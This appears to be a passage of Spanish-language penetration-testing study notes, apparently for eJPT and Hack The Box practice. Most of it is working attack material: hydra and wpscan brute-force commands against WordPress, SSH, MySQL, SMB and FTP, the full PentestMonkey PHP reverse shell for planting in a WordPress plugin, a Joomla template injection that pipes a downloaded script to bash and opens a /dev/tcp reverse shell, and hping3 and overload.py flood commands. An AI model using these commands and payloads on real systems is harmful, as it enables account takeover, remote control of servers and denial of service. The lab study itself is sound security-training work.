+              ^           ^                                                        ^           ^                          ^
+(Diccionario de user)   (contraseña encontrada)                                                                      Aqui pondré el mensaje de error que devuelve WP
+
+
+
+
+-En caso de no conocer contraseña pero si un usuario:-----------
+
+> sudo hydra -l admin -P /ruta/diccionario/contrasenas.txt 10.10.10.10 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
+              ^  ^     ^   ^                                                                 
+(En caso de que el panel no arroje mensaje de error, y se aplique un redireccionamiento:)
+(El mensaje final debe ser:    ....&pwd=^PASS^&wp-submit=Log+In:S=302"
+
+EJPT Diccionarios de constraseñas, podemos usar---> /usr/share/wordlists/rockyou.txt 
+EJPT -------------------------------->              /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  
+EJPT -------------------------------->              /usr/share/metasploit-framework/data/wordlists/unix_users.txt  
+
+
+
+-También podemos probar doble diccionario, y probar conexion por SSH:-------------------
+MANERA 1:
+
+> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
+         ^            ^                                               ^
+MANERA 2:
+> hydra   "          "         "         "          "    ssh://10.10.10.10
+
+
+
+-También podem  os probar doble diccionario, y probar conexion por MySQL:-----------------
+> hydra   "        "         "         "          "    mysql://10.10.10.10
+
+
+
+ATAQUE DE FUERZA BRUTA A SMB CON HYDRA: ------------------------------------------------
+> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10
+(Si da errores no es compatible..)
+
+
+
+
+ATAQUE DE FUERZA BRUTA A FTP CON HYDRA: ------------------------------------------------
+> hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
+
+
+--------------------------------------------------------------------------------------------------------------------------
+
+
+
+21. (  WPScan  ) Cracking Passwords Wordpress----------------------------------------------------------------------------------
+
+-Sabiendo usuario:
+
+> sudo wpscan --url https://10.10.10.10 -U admin -P /usr/share/wordlists/rockyou.txt
+
+
+
+22.reverseShell.php desde plugin en Wordpress.----------------------------------------------------
+
+Una vez DENTRO DE WORDPRESS:
+- -> Plugins -> Editar codigo--> Pegamos la reverseShell.php ( de PentestMonkey con nuestra IP y puerto 4444)
+-->Nos ponemos en escucha con netcat. $> nc -nvlp 4444
+-->Guardamos el código --> Volvemos a los Plugins y lo activamos--> 'Activar'
+--> Recibimos la conexión en nuestra máquina
+
+-----------(reverseShell.php)--------------
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+------------------------------------------------------------------------------------------------------------ 
+
+23. joomscan. -----------------------------------------------------------------------------------------------------------------
+(Ver maquina de HTB  Devvortex)
+
+-Ruta para ver version de joomla:
+
+/administrator/manifests/files/joomla.xml   
+<version>4.2.6</version>  (Buscar vulns con esa versión de joomla....)
+
+-Ver informacion sensible de la BD:
+> curl http://webjoomla.com/api/index.php/v1/config/application?public=true -vv
+(Puede devolver info interesante o passwords)
+
+
+
+UNA VEZ DENTRO DEL PANEL DE JOOMLA: 
+-ir a :   System > Site Templates > 'TEMA?' Details and Files
+                                                                   
+Y en el archivo error.php, introducimos al llamada a descargar desde nuestra maquina atacante nuestra shell en PHP :
+(Añadimos esta linea..)
+<?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>    
+
+
+-En nuestra maquina creamos la reverse shell en PHP, para que la ejecute..:
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+
+-y compartimos servidor con python para que la descargue.
+> python3 -m http.server 8080
+
+-Nos ponemos en escucha con netcat:
+
+-Ejecutamos un curl al error para que se cargue el comando que añadimos:
+curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+
+(Recibiremos la shell en la consola de netcat)
+
+
+
+24. DDoS  Ataque de Denegación de servicio ------------------------------------------------------------------------------------
+
+> sudo hping3 --icmp --rand-source --flood -d 1400 10.10.10.10
+
+(De esta manera desde multiples IP manda ataques a la victima. indicamos 1400 paquetes, el maximo es 1500.)
+(La victima no podrá acceder a internet. No tendrá conexión)
+
+25. DDoS Herramienta overload de github ---------------------------------------------------------------------------------------
+
+G:  https://github.com/7zx/overload
+
+> python3 overload.py
+
+METHOD: HTTP
+URL: https://webvictima.com
+THREADS: 550
+...
+(Manda paquetes provocando la sobracarga...)
+
